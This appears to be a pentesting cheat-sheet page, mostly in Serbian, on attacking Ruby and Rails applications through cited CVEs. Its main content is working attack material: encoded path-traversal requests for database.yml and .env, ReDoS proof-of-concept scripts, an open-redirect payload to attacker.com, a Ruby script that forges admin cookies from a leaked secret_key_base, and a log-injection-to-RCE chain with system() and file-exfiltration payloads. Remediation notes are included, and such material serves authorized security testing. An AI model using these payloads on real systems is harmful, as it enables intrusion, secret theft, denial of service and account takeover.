# Ruby trikovi

{{#include ../../banners/hacktricks-training.md}}

## Otpremanje fajla do RCE

Kao što je objašnjeno u [this article](https://www.offsec.com/blog/cve-2024-46986/), otpremanje `.rb` fajla u osetljive direktorijume kao što su `config/initializers/` može dovesti do remote code execution (RCE) u Ruby on Rails aplikacijama.

Saveti:
- Druga mesta za boot/eager-load koja se izvršavaju pri startu aplikacije su takođe rizična ako su writeable (npr. `config/initializers/` je klasičan primer). Ako nađete arbitrarno otpremanje fajla koje dospe bilo gde ispod `config/` i kasnije se evaluira/require-uje, možete dobiti RCE pri podizanju.
- Tražite dev/staging build-ove koji kopiraju fajlove pod kontrolom korisnika u container image gde će ih Rails učitati na boot.

## Active Storage transformacija slike → izvršavanje komandi (CVE-2025-24293)

Kada aplikacija koristi Active Storage sa `image_processing` + `mini_magick`, i prosleđuje nepoverljive parametre metodama za transformaciju slika, Rails verzije pre 7.1.5.2 / 7.2.2.2 / 8.0.2.1 mogu dozvoliti command injection zato što su neke transformation metode greškom dozvoljene po defaultu.

- Ranljiv obrazac izgleda ovako:
```erb
<%= image_tag blob.variant(params[:t] => params[:v]) %>
```
gde su `params[:t]` i/ili `params[:v]` pod kontrolom napadača.

- Šta pokušati tokom testiranja
- Identifikujte endpoint-e koji prihvataju variant/processing opcije, nazive transformacija, ili proizvoljne ImageMagick argumente.
- Fuzz-ujte `params[:t]` i `params[:v]` tražeći sumnjive greške ili nuspojave izvršavanja. Ako možete uticati na ime metode ili proslediti raw argumente koji stižu do MiniMagick-a, možda ćete dobiti code exec na hostu koji obrađuje slike.
- Ako imate samo read-access na generisane variante, pokušajte blind exfiltration kroz crafted ImageMagick operacije.

- Remedijacija/detekcije
- Ako vidite Rails < 7.1.5.2 / 7.2.2.2 / 8.0.2.1 sa Active Storage + `image_processing` + `mini_magick` i transformacijama pod kontrolom korisnika, smatrate to eksploatabilnim. Preporučite nadogradnju i primenu stroge allowliste za metode/parametre i ojačanu ImageMagick politiku.

## Rack::Static LFI / path traversal (CVE-2025-27610)

Ako ciljni stack koristi Rack middleware direktno ili putem framework-ova, verzije `rack` pre 2.2.13, 3.0.14 i 3.1.12 dozvoljavaju Local File Inclusion putem `Rack::Static` kada je `:root` unset/misconfigured. Encodovana traversala u `PATH_INFO` može otkriti fajlove pod radnim direktorijumom procesa ili neočekivanim root-om.

- Tražite aplikacije koje mount-uju `Rack::Static` u `config.ru` ili middleware stack-ove. Probajte encodovane traversale protiv statičkih putanja, na primer:
```text
GET /assets/%2e%2e/%2e%2e/config/database.yml
GET /favicon.ico/..%2f..%2f.env
```
Prilagodite prefix da odgovara konfigurisanom `urls:`. Ako aplikacija odgovori sadržajem fajla, verovatno imate LFI ka svemu ispod razrešenog `:root`.

- Mitigacija: nadogradite Rack; osigurajte da `:root` pokazuje samo na direktorijum javnih fajlova i da je eksplicitno postavljen.

## Rack multipart parser ReDoS / request smuggling (CVE-2024-25126)

Rack < `3.0.9.1` i < `2.2.8.1` trošio je super-linearno vreme parsirajući crafted `Content-Type: multipart/form-data` headere. Jedan POST sa gigantskom listom `A=` parametara može zablokirati Puma/Unicorn workera i izazvati DoS ili iscrpljivanje reda zahteva.

- Quick PoC (will hang one worker):
```bash
python - <<'PY'
import requests
h = {'Content-Type': 'multipart/form-data; ' + 'A='*5000}
requests.post('http://target/', data='x', headers=h)
PY
```
- Radi protiv bilo kog Rack-based stack-a (Rails/Sinatra/Hanami/Grape). Ako stoji iza nginx/haproxy sa keep-alive, ponavljajte paralelno da iscrpite workere.
- Popravljeno je tako što je parser postao linearan; tražite `rack` gem verziju < `3.0.9.1` ili < `2.2.8.1`. U procenama napomenite da WAF-ovi retko blokiraju ovo zato što je header sintaksno validan.

## REXML XML parser ReDoS (CVE-2024-49761)

REXML gem < 3.3.9 (Ruby 3.1 i ranije) katastrofalno backtrack-uje pri parsiranju hex numeric character references koji sadrže duge nizove cifara (npr. `&#1111111111111x41;`). Bilo koji XML koji obrađuje REXML ili biblioteke koje ga obavijaju (SOAP/XML API klijenti, SAML, SVG upload-i) može biti zloupotrebljen za iscrpljivanje CPU-a.

Minimalni trigger protiv Rails endpoint-a koji parsira XML:
```bash
curl -X POST http://target/xml -H 'Content-Type: application/xml' \
--data '<?xml version="1.0"?><r>&#11111111111111111111111111x41;</r>'
```
Ako proces ostane zauzet nekoliko sekundi i worker CPU naglo poraste, verovatno je ranjiv. Napad zahteva low bandwidth i utiče i na background jobs koji obrađuju XML.

## CGI cookie parsing / escapeElement ReDoS (CVE-2025-27219 & CVE-2025-27220)

Aplikacije koje koriste `cgi` gem (podrazumevano u mnogim Rack stack-ovima) mogu biti zamrznute jednim malicioznim headerom:
- `CGI::Cookie.parse` je imala super-linearno ponašanje; ogromni cookie stringovi (hiljade delimitera) izazivaju O(N²) ponašanje.
- `CGI::Util#escapeElement` regex je omogućavao ReDoS tokom HTML escaping-a.

Both issues are fixed in `cgi` 0.3.5.1 / 0.3.7 / 0.4.2. Za pentests, pošaljite ogroman `Cookie:` header ili prosledite untrusted HTML helper kodu i pratite worker lockup. Kombinujte sa keep-alive da pojačate efekat.

## Basecamp `googlesign_in` open redirect / cookie flash leak (CVE-2025-57821)

The `googlesign_in` gem < 1.3.0 (used for Google OAuth on Rails) performed an incomplete same-origin check on the `proceedto` parameter. A malformed URL like `proceedto=//attacker.com/%2F..` bypasses the check and redirects the user off-site while preserving Rails flash/session cookies.

Exploit flow:
1. Žrtva klikne na crafted Google Sign-In link koji je hostovan od strane napadača.
2. Nakon autentifikacije, gem preusmerava na domen kontrolisan od napadača, leaking flash notices ili bilo koje podatke koji su sačuvani u cookies scoped to the wildcard domain.
3. Ako aplikacija čuva kratkoročne tokene ili magic links u flash-u, ovo se može iskoristiti za account takeover.

Tokom testiranja, grep-ujte Gemfile.lock za `googlesign_in` < 1.3.0 i probajte malformisane `proceedto` vrednosti. Potvrdite preko Location header-a i cookie reflection-a.

## Forging/decrypting Rails cookies when `secret_key_base` is leaked

Rails enkriptuje i potpisuje cookies koristeći ključeve izvedene iz `secret_key_base`. If that value leaks (e.g., in a repo, logs, or misconfigured credentials), obično možete decrypt-ovati, modifikovati i re-encrypt-ovati cookies. Ovo često vodi do authz bypass-a ako aplikacija čuva role, user ID-eve ili feature flags u cookies.

Minimal Ruby za decrypt i re-encrypt modern cookies (AES-256-GCM, podrazumevano u recentnim Rails):

<details>
<summary>Ruby to decrypt/forge cookies</summary>
```ruby
require 'cgi'
require 'json'
require 'active_support'
require 'active_support/message_encryptor'
require 'active_support/key_generator'

secret_key_base = ENV.fetch('SECRET_KEY_BASE_LEAKED')
raw_cookie = CGI.unescape(ARGV[0])

salt   = 'authenticated encrypted cookie'
cipher = 'aes-256-gcm'
key_len = ActiveSupport::MessageEncryptor.key_len(cipher)
secret  = ActiveSupport::KeyGenerator.new(secret_key_base, iterations: 1000).generate_key(salt, key_len)
enc     = ActiveSupport::MessageEncryptor.new(secret, cipher: cipher, serializer: JSON)

plain = enc.decrypt_and_verify(raw_cookie)
puts "Decrypted: #{plain.inspect}"

# Modify and re-encrypt (example: escalate role)
plain['role'] = 'admin' if plain.is_a?(Hash)
forged = enc.encrypt_and_sign(plain)
puts "Forged cookie: #{CGI.escape(forged)}"
```
</details>
Napomene:
- Starije aplikacije mogu koristiti AES-256-CBC i saltove `encrypted cookie` / `signed encrypted cookie`, ili JSON/Marshal serializere. Prilagodite saltove, šifru i serializer prema potrebi.
- U slučaju kompromitacije/ocenjivanja, rotirajte `secret_key_base` da poništite sve postojeće cookies.

## See also (Ruby/Rails-specific vulns)

- Ruby deserialization and class pollution:
{{#ref}}
../../pentesting-web/deserialization/README.md
{{#endref}}
{{#ref}}
../../pentesting-web/deserialization/ruby-class-pollution.md
{{#endref}}
{{#ref}}
../../pentesting-web/deserialization/ruby-_json-pollution.md
{{#endref}}
- Template injection in Ruby engines (ERB/Haml/Slim, etc.):
{{#ref}}
../../pentesting-web/ssti-server-side-template-injection/README.md
{{#endref}}


## Log Injection → RCE via Ruby `load` and `Pathname.cleanpath` smuggling

Kada aplikacija (često jednostavan Rack/Sinatra/Rails endpoint) ispunjava oba uslova:
- zapisuje korisnički kontrolisan string doslovno, i
- kasnije `load`-uje fajl čija je putanja izvedena iz istog stringa (posle `Pathname#cleanpath`),

Često možete postići remote code execution zatrovavši log i zatim primoravši aplikaciju da `load`-uje log fajl. Ključne primitive:

- Ruby `load` izvršava sadržaj ciljnog fajla kao Ruby bez obzira na ekstenziju fajla. Bilo koji čitljivi tekstualni fajl čiji sadržaj parsira kao Ruby biće izvršen.
- `Pathname#cleanpath` objedinjuje (`.` i `..`) segmente bez pristupa filesystemu, omogućavajući path smuggling: napadačem kontrolisani junk može biti dodat ispred za logovanje dok očišćena putanja i dalje rešava na željeni fajl za izvršenje (npr. `../logs/error.log`).

### Minimalni ranjivi obrazac
```ruby
require 'logger'
require 'pathname'

logger   = Logger.new('logs/error.log')
param    = CGI.unescape(params[:script])
path_obj = Pathname.new(param)

logger.info("Running backup script #{param}")            # Raw log of user input
load "scripts/#{path_obj.cleanpath}"                     # Executes file after cleanpath
```
### Zašto log može sadržati validan Ruby
`Logger` piše prefiksne linije poput:
```
I, [9/2/2025 #209384]  INFO -- : Running backup script <USER_INPUT>
```
U Rubyju, `#` započinje komentar, a `9/2/2025` je samo aritmetika. Da biste ubacili validan Ruby kod, morate:
- Počnite svoj payload u novom redu tako da ne bude zakomentarisan od strane `#` u INFO liniji; pošaljite vodeći newline (`\n` ili `%0A`).
- Zatvorite viseci `[` koji je uveden INFO linijom. Uobičajeni trik je da počnete sa `]` i opciono zadovoljite parser sa `][0]=1`.
- Zatim stavite proizvoljni Ruby (npr. `system(...)`).

Example of what will end up in the log after one request with a crafted param:
```
I, [9/2/2025 #209384]  INFO -- : Running backup script
][0]=1;system("touch /tmp/pwned")#://../../../../logs/error.log
```
### Prošvercavanje jedinstvenog stringa koji i zabeleži kod u log i rešava se na putanju loga
Želimo jedan string pod kontrolom napadača koji:
- kada se zabeleži u neobrađenom obliku, sadrži naš Ruby payload, i
- kada se prosledi kroz `Pathname.new(<input>).cleanpath`, rešava se u `../logs/error.log` tako da naredni `load` izvrši upravo zatrovani log fajl.

`Pathname#cleanpath` ignoriše scheme i sažima komponente za traverzalu, tako da sledeće radi:
```ruby
require 'pathname'

p = Pathname.new("\n][0]=1;system(\"touch /tmp/pwned\")#://../../../../logs/error.log")
puts p.cleanpath   # => ../logs/error.log
```
- Znak `#` pre `://` osigurava da Ruby ignoriše ostatak kada se log izvrši, dok `cleanpath` i dalje redukuje sufiks na `../logs/error.log`.
- Vodeći novi red prekida INFO liniju; `]` zatvara viseću zagradu; `][0]=1` zadovoljava parser.

### End-to-end eksploatacija
1. Pošaljite sledeće kao ime backup skripte (URL-encode the first newline as `%0A` if needed):
```
\n][0]=1;system("id > /tmp/pwned")#://../../../../logs/error.log
```
2. Aplikacija upisuje vaš sirovi string u `logs/error.log`.
3. Aplikacija izračunava `cleanpath` koji se rešava u `../logs/error.log` i poziva `load` na njega.
4. Ruby izvršava kod koji ste ubacili u log.

Za eksfiltraciju fajla u CTF-like okruženju:
```
\n][0]=1;f=Dir['/tmp/flag*.txt'][0];c=File.read(f);puts c#://../../../../logs/error.log
```
URL-encoded PoC (prvi karakter je novi red):
```
%0A%5D%5B0%5D%3D1%3Bf%3DDir%5B%27%2Ftmp%2Fflag%2A.txt%27%5D%5B0%5D%3Bc%3DFile.read(f)%3Bputs%20c%23%3A%2F%2F..%2F..%2F..%2F..%2Flogs%2Ferror.log
```
## Reference

- [Rails bezbednosno saopštenje: CVE-2025-24293 Active Storage nebezbedne metode transformacije (ispravljeno u 7.1.5.2 / 7.2.2.2 / 8.0.2.1)](https://discuss.rubyonrails.org/t/cve-2025-24293-active-storage-allowed-transformation-methods-potentially-unsafe/89670)
- [GitHub saopštenje: Rack::Static Local File Inclusion (CVE-2025-27610)](https://github.com/advisories/GHSA-7wqh-767x-r66v)
- [Hardware Monitor Dojo-CTF #44: Log Injection to Ruby RCE (YesWeHack Dojo)](https://www.yeswehack.com/dojo/dojo-ctf-challenge-winners-44)
- [Ruby Pathname.cleanpath dokumentacija](https://docs.ruby-lang.org/en/3.4/Pathname.html#method-i-cleanpath)
- [Ruby Logger](https://ruby-doc.org/stdlib-2.5.1/libdoc/logger/rdoc/Logger.html)
- [Kako load radi u Rubyju](https://blog.appsignal.com/2023/04/19/how-to-load-code-in-ruby.html)
- [Rack multipart ReDoS saopštenje (CVE-2024-25126)](https://www.cve.news/cve-2024-25126/)
- [Ruby bezbednosna saopštenja za CGI / URI (CVE-2025-27219/27220/27221)](https://www.ruby-lang.org/en/news/2025/02/26/security-advisories/)

{{#include ../../banners/hacktricks-training.md}}
